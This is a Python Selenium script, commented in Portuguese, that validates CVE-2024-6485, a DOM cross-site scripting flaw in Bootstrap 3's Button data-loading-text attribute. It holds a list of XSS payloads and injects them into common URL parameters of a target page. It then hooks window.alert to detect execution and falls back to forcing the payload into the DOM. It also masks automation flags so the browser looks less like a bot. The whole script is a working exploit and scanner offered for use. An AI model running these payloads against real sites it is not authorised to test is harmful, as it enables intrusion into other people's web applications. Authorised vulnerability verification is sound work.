#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, sys, time, urllib.parse as up
from contextlib import contextmanager

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    NoSuchElementException, UnexpectedAlertPresentException, WebDriverException
)

# --- (Opcional) fallback p/ webdriver-manager se Selenium Manager falhar ---
USE_WDM_FALLBACK = True
try:
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    from webdriver_manager.core.utils import ChromeType
except Exception:
    USE_WDM_FALLBACK = False

COMMON_PARAMS = ["loading","status","msg","message","text","label","title","info","notice"]

PAYLOADS = [
    'Loading... <img src=x onerror=alert(1337)>',
    '<svg onload=alert(1337)>',
    '"><img src=x onerror=alert(1337)>'
]

JS_HOOK_ALERT = r"""
(function(){
  try {
    window.__xssFired = false;
    var _old = window.alert;
    window.alert = function(msg){ window.__xssFired = true; window.__xssMsg = String(msg||''); try{ _old(msg);}catch(e){} };
  } catch(e) {}
})();
"""

JS_TRIGGER_LOADING = r"""
(function(){
  var nodes = document.querySelectorAll('[data-loading-text]');
  var n = nodes.length;
  try{
    if (window.jQuery && jQuery.fn && jQuery.fn.button) {
      jQuery('[data-loading-text]').button('loading');
      return {ok:true, via:'jquery', count:n};
    }
  }catch(e){}
  for (var i=0;i<n;i++){
    var t = nodes[i].getAttribute('data-loading-text');
    if (t!=null){ nodes[i].innerHTML = t; }
  }
  return {ok:true, via:'fallback', count:n};
})();
"""

JS_COUNT_DATA_LOADING = "return document.querySelectorAll('[data-loading-text]').length;"

JS_INJECT_ATTR = r"""
(function(sel, html){
  var nodes = document.querySelectorAll(sel);
  for (var i=0;i<nodes.length;i++){
    try { nodes[i].setAttribute('data-loading-text', html); } catch(e){}
  }
  return nodes.length;
})
"""

def build_url(base, param, value):
    parts = list(up.urlsplit(base))
    qs = up.parse_qs(parts[3], keep_blank_values=True)
    qs[param] = [value]
    parts[3] = up.urlencode(qs, doseq=True)
    return up.urlunsplit(parts)

from contextlib import contextmanager

@contextmanager
def browser(headless=True, proxy=None, user_agent=None, binary=None, chromium=False):
    opts = Options()
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1366,850")
    if proxy:
        opts.add_argument(f"--proxy-server={proxy}")
    if user_agent:
        opts.add_argument(f"--user-agent={user_agent}")
    if binary:
        opts.binary_location = binary
    # “menos cara de bot”
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option('useAutomationExtension', False)

    drv = None
    err = None

    # 1) Preferir Selenium Manager (resolve versão certa sozinho)
    try:
        drv = webdriver.Chrome(options=opts)  # Selenium >=4.6 baixa o driver correto
    except Exception as e:
        err = e

    # 2) Fallback: webdriver-manager apontando para CHROMIUM (Debian/Kali)
    if drv is None and USE_WDM_FALLBACK:
        try:
            chrome_type = ChromeType.CHROMIUM if chromium else ChromeType.GOOGLE
            service = Service(ChromeDriverManager(chrome_type=chrome_type).install())
            drv = webdriver.Chrome(service=service, options=opts)
        except Exception as e2:
            if err:  # mantenha o 1º + 2º erro para diagnosticar
                err = (err, e2)
            else:
                err = e2

    if drv is None:
        raise SystemExit(f"Falha iniciando Chrome/Chromium. Detalhe: {err}")

    try:
        yield drv
    finally:
        try: drv.quit()
        except: pass

def visit_and_hook(driver, url, cookies=None, timeout=30):
    driver.set_page_load_timeout(timeout)
    driver.get(url)
    if cookies:
        for k,v in cookies.items():
            driver.add_cookie({"name":k,"value":v})
        driver.get(url)
    driver.execute_script(JS_HOOK_ALERT)
    time.sleep(0.3)

def try_param_mode(driver, base_url, param, payloads):
    print(f"[i] Testando parâmetro '{param}'…")
    for p in payloads:
        u = build_url(base_url, param, p)
        try:
            visit_and_hook(driver, u)
        except WebDriverException as e:
            print(f"[!] Falha ao carregar {u}: {e}")
            continue

        count = driver.execute_script(JS_COUNT_DATA_LOADING)
        print(f"    - [data-loading-text] encontrados: {count}")

        try:
            driver.execute_script(JS_TRIGGER_LOADING)
            time.sleep(0.6)
        except UnexpectedAlertPresentException:
            pass

        fired = driver.execute_script("return window.__xssFired === true;")
        if fired:
            msg = driver.execute_script("return window.__xssMsg || ''")
            print(f"[✔] XSS via parâmetro '{param}' (payload: {p!r}) – msg: {msg!r}")
            return True, {"param":param, "payload":p, "url":u, "mode":"url"}
        else:
            print(f"[ ] Sem execução com payload atual.")
    return False, None

def try_forced_mode(driver, base_url):
    print("[i] Modo forçado (injeção direta no DOM) …")
    visit_and_hook(driver, base_url)

    count = driver.execute_script(JS_COUNT_DATA_LOADING)
    print(f"    - [data-loading-text] encontrados: {count}")
    if count == 0:
        try:
            buttons = driver.find_elements(By.CSS_SELECTOR, "button.btn, a.btn, input.btn")
        except NoSuchElementException:
            buttons = []
        if buttons:
            driver.execute_script("arguments[0].setAttribute('data-loading-text', arguments[1]);",
                                  buttons[0], PAYLOADS[0])
            count = driver.execute_script(JS_COUNT_DATA_LOADING)
            print(f"    - Adicionado data-loading-text em um botão; total: {count}")
    if count == 0:
        print("[ ] Sem botões e sem como injetar atributo – não foi possível forçar.")
        return False, None

    driver.execute_script(JS_INJECT_ATTR, "[data-loading-text]", PAYLOADS[0])
    try:
        driver.execute_script(JS_TRIGGER_LOADING)
        time.sleep(0.6)
    except UnexpectedAlertPresentException:
        pass

    fired = driver.execute_script("return window.__xssFired === true;")
    if fired:
        msg = driver.execute_script("return window.__xssMsg || ''")
        print(f"[✔] XSS disparou (forçado DOM). msg: {msg!r}")
        return True, {"payload":PAYLOADS[0], "url":base_url, "mode":"forced"}
    else:
        print("[ ] Sem execução no modo forçado (talvez CSP rígida).")
        return False, None

def parse_kv(s):
    out = {}
    if not s: return out
    parts = [x.strip() for x in s.split(";")]
    for part in parts:
        if not part: continue
        if "=" in part:
            k,v = part.split("=",1)
            out[k.strip()] = v.strip()
    return out

def main():
    ap = argparse.ArgumentParser(description="Validador CVE-2024-6485 (Bootstrap 3 Button data-loading-text XSS)")
    ap.add_argument("-u","--url", required=True, help="URL alvo (página que contém o botão)")
    ap.add_argument("--param", help="Nome do parâmetro de URL a testar (se não passar, testa uma lista comum)")
    ap.add_argument("--headful", action="store_true", help="Abrir navegador visível (não headless)")
    ap.add_argument("--proxy", help="Proxy (ex.: http://127.0.0.1:8080)")
    ap.add_argument("--cookies", help='Cookies em linha: "name1=val1; name2=val2"')
    ap.add_argument("--ua", help="User-Agent customizado")
    ap.add_argument("--binary", help="Caminho do binário do Chromium/Chrome (ex.: /usr/bin/chromium)")
    ap.add_argument("--chromium", action="store_true", help="Força fallback para Chromium no webdriver-manager")
    args = ap.parse_args()

    cookies = parse_kv(args.cookies) if args.cookies else None
    params = [args.param] if args.param else COMMON_PARAMS

    with browser(headless=not args.headful, proxy=args.proxy, user_agent=args.ua,
                 binary=args.binary, chromium=args.chromium) as drv:
        # 1) URL param
        for p in params:
            ok, data = try_param_mode(drv, args.url, p, PAYLOADS)
            if ok:
                print("\n=== RESULTADO ===")
                print("[VULN] DOM-XSS via parâmetro de URL (CVE-2024-6485) ✅")
                print(f"URL: {data['url']}")
                print(f"Parâmetro: {data['param']}")
                print(f"Payload: {data['payload']}")
                return 0

        # 2) Forçado DOM
        ok, data = try_forced_mode(drv, args.url)
        print("\n=== RESULTADO ===")
        if ok:
            print("[VULN] DOM-XSS no componente Button (sink confirmado).")
            print(f"URL: {data['url']}")
            print(f"Modo: {data['mode']}")
            print(f"Payload: {data['payload']}")
            print("Obs.: prova o sink mesmo sem binding da querystring.")
            return 0
        else:
            print("[NÃO REPRODUZIDO] Possíveis causas: sem binding entrada→data-loading-text; CSP rígida; "
                  "fluxo não aciona loading; ou plugin/override corrigido.")
            return 2

if __name__ == "__main__":
    sys.exit(main())
